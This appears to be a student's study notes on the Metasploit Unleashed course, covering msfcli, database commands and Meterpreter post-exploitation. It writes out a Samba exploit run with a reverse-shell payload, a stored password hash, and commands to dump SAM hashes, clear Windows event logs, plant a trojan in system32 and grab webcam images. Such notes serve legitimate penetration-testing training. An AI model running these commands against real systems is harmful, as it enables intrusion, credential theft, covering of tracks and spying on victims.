# metasploit-unleashed  
### offensive security explanation of metasploit  
#### assuming you have all the requirements to get going 

### What is the msfcli?
The msfcli provides a powerful command line interface to the framework. This allows you to easily add Metasploit exploits into any scripts you may create.  
```
root@kali:~# msfconsole -x "use exploit/multi/samba/usermap_script;\
set RHOST 172.16.194.172;\
set PAYLOAD cmd/unix/reverse;\
set LHOST 172.16.194.163;\
run"
```
### running the cli
`msfcli -h`  
Usage: /usr/bin/msfcli  >option=value> [mode]  
*Note: when using msfcli, variables are assigned using the “equal to” operator = and that all options are case-sensitive.*  
 **for help** or your not sure what to do next append the letter ‘O‘.  
`msfcli exploit/multi/samba/usermap_script O` 

To display available payloads append the letter ‘P‘.
`msfcli exploit/multi/samba/usermap_script P`  

```
The only real drawback of msfcli is that it is not supported quite as well as msfconsole and it can only handle one shell at a time, making it rather impractical for client-side attacks. It also doesn’t support any of the advanced automation features of msfconsole.
```

## Msfconsole Commands
[https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/](msfconsole)  
too many to list all of them here

## Using Metasploit DB 
1. `service postgresql start`  
2. `msfdb init`  
3. `msfconsole`  
4. `msf > db_status`  
5. `msf > workspace`  -h  
6. `msf > workspace -a lab1`  adds new  
7. `msf help`  
8. `msf > db_import /root/file-to-scan/  
9. `msf > hosts`  
10. `msf > db_nmap -A ip-address-to-scan  
11. `msf > db_export -h`  help exporting data  
12. `msf > hosts -h`  
13. `msf > hosts -c address,os_flavor`  or append -S Linux  
14. `msf > use auxiliary/scanner/portscan/tcp`  
15. `msf auxiliary(tcp) > show options`  
16. `msf  auxiliary(tcp) > hosts -c address,os_flavor -S Linux -R`  
17. `msf  auxiliary(tcp) > hosts -R`   
18. `msf > services -h`  
19. `msf > services -c name,info 172.16.194.134`  append -S http  
20. `msf > services -s http -c port 172.16.194.134 -o /root/msfu/http.csv`  export to .CSV  
21. `msf > creds`  stores any credentials saved along the way.  
22. `msf > creds -a 172.16.194.134 -p 445 -u Administrator -P 7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::`  ex.
23. `msf > loot -h`  
24. `msf  exploit(usermap_script) > exploit`  how one would populate the db with some 'loot'  

## Meterpreter  is the shell you get back on a victims computer.  Its a live session.    
### basic commands  
1. `meterpreter > help`  
2. `meterpreter > background`  sends session to background and u back to msf cmd prompt  
```
msf exploit(ms08_067_netapi) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >
```
3. `cat`  same as always.  
4. `cd` and `pwd`   navigate victims computer  
```
meterpreter > pwd
c:\
meterpreter > cd c:\windows
meterpreter > pwd
c:\windows
meterpreter >
```  
5. `clearev`  clears the Application, System and Security logs on a Window systems.  
6. `download`   downloads a file from the remote machine  
```
meterpreter > download c:\\boot.ini
[*] downloading: c:\boot.ini -> c:\boot.ini
[*] downloaded : c:\boot.ini -> c:\boot.ini/boot.ini
meterpreter >
```
7. `edit`  opens a file located on the target host. ex `meterpreter > edit edit.txt`  
8. `execute`  runs a command on the target  `meterpreter > execute -f cmd.exe -i -H`  
9. `getuid`  displays user that the meterpreter is using on host  
10. `hashdump`  post module will dump the contents of the SAM database `meterpreter > run post/windows/gather/hashdump`  
11. `idletime`  display the number of seconds that the user at the remote machine has been idle.  
12. `ipconfig` displays the network interfaces and addresses on the remote machine.  
13. `lpwd` and `lcd`  used to display and change the local working directory respectively  `lpwd` is where you are on your machine `lcd` is how you move around the file system  
14. `ls` lists all files in current dir on victim machine.  
15. `migrate` you can migrate to another process on the victim `meterpreter > run post/windows/manage/migrate`  
16. `ps` displays a list of running processes on the target.  
17.  `resource`  executes meterpreter instructions located inside a text file `resource readfile.txt`  
18. `search`  provides a way of finding files on victim computer. `search -f autoexec.bat`  
19. `shell`  will give you a standard shell on victim computer  
20. `upload`  make note of double-slashes `meterpreter > upload evil_trojan.exe c:\\windows\\system32`  
21. `webcam_list` display currently available web cams on vc  
22. `webcam_snap`  grabs a picture from a connected web cam `meterpreter > webcam_snap -i 1 -v false`  

### Python Extension  
`meterpreter > load python`  - `help`  
##### some python examples  
`meterpreter > python_execute "print 'Good morning! It\\'s 5am'"`  
You can also save to a variable, and print its content using the “-r” switch.  
```
meterpreter > python_execute "import os; cd = os.getcwd()" -r cd
[+] cd = C:\Users\loneferret\Downloads
meterpreter >
```
```
root@kali:~# cat findfiles.py 
import os
for root, dirs, files in os.walk("c://"):
    for file in files:
        if file.endswith(".txt") and file.startswith("readme"):
             print(os.path.join(root, file))
```
`meterpreter > python_import -f /root/findfiles.py`  





 
